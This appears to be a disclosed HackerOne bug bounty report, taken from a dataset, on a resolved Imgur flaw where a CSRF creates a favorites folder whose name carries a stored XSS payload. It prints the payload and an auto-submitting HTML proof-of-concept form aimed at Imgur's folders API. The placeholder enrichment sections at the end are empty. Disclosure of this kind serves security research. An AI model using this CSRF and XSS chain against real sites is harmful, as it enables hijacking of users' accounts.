---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '323005'
original_report_id: '323005'
title: CSRF leads to a stored self xss
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: imgur
created_at: '2018-03-06T23:34:16.814Z'
disclosed_at: '2019-08-30T05:31:40.974Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 142
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# CSRF leads to a stored self xss

## Metadata

- HackerOne Report ID: 323005
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: imgur
- Disclosed At: 2019-08-30T05:31:40.974Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Followup from #311460

#Summary
Self xss and CSRF are both out of scope, but when paired it is possible to create an attack on a user.

#Description
A favorites folder with an xss payload for a name will launch when saving an image to said folder.

This can be verified by following these steps
* Visit your favorites
* Create New Folder
* Change name to
```
"'><img src=x onerror=prompt(1)>
```
* Save
* Visit a photo
* Click the little plus next to the heart on bottom left of image
* Add to the folder
* xss will launch

Since self xss is out of scope, we will need a method of delivering this attack to a user.
This can be done via a CSRF to create a favorites folder.

# POC

Using a form like so to create the CSRF:
```
<html>
<body onload='document.forms[0].submit()'>
  <form method='POST' enctype='application/json' action='https://api.imgur.com/3/folders'>
    <input name='name' value='New Test"><img src=x onerror=prompt(2)>'>
    <input name='is_private' value='false'>
  </form>
</body>
</html>
```

Or be logged into your imgur account and visit

http://blackdoorsec.net/sandbox/imgur2.html

This will create the folder with an xss name that can be used to attack an account.

## Impact

account hijacking
since a user would still need to add an image to the folder for the attack to work, the success rate will be lower than normal

#Scenerio
since reddit/imgur communities overlap malicious links containing the CSRF could be sent throughout the site. out of the few thousand hits the link would get, i imagine there would be several successful compromised imgur accounts.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
